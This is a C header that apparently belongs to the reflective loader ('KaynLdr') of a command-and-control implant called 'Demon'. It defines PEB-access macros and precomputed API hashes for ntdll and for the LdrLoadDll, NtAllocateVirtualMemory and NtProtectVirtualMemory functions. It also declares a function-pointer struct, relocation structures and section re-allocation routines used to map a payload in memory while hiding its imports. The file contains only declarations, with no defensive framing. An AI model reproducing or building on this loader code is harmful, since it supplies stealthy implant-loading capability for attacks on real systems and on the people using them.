#ifndef DEMON_KAYNLDR_H
#define DEMON_KAYNLDR_H

#include <windows.h>

#define HASH_KEY 5381

#ifdef WIN_X64
#define PPEB_PTR __readgsqword( 0x60 )
#else
#define PPEB_PTR __readgsqword( 0x30 )
#endif

#define MemCopy                         __builtin_memcpy
#define NTDLL_HASH                      0x70e61753

#define SYS_LDRLOADDLL                  0x307db23
#define SYS_NTALLOCATEVIRTUALMEMORY     0x6793c34c
#define SYS_NTPROTECTEDVIRTUALMEMORY    0x82962c8

#define DLLEXPORT                       __declspec( dllexport )

#define U_PTR( x )                      ( ( UINT_PTR ) x )
#define C_PTR( x )                      ( ( LPVOID ) x )

typedef struct
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} U_STRING, *PU_STRING;

typedef struct {
    struct {
        NTSTATUS ( NTAPI *LdrLoadDll )(
                PWSTR           DllPath,
                PULONG          DllCharacteristics,
                PU_STRING       DllName,
                PVOID           *DllHandle
        );

        NTSTATUS ( NTAPI *NtAllocateVirtualMemory ) (
                HANDLE      ProcessHandle,
                PVOID       *BaseAddress,
                ULONG_PTR   ZeroBits,
                PSIZE_T     RegionSize,
                ULONG       AllocationType,
                ULONG       Protect
        );

        NTSTATUS ( NTAPI *NtProtectVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PSIZE_T RegionSize,
                ULONG   NewProtect,
                PULONG  OldProtect
        );
    } Win32;

    struct {
        PVOID Ntdll;
    } Modules ;

} KAYNINSTANCE, *PKAYNINSTANCE ;

LPVOID  KaynCaller();

typedef struct {
    WORD offset :12;
    WORD type   :4;
} *PIMAGE_RELOC;

VOID    KReAllocSections( PVOID KaynImage, PVOID ImageBase, PVOID Dir );


#endif
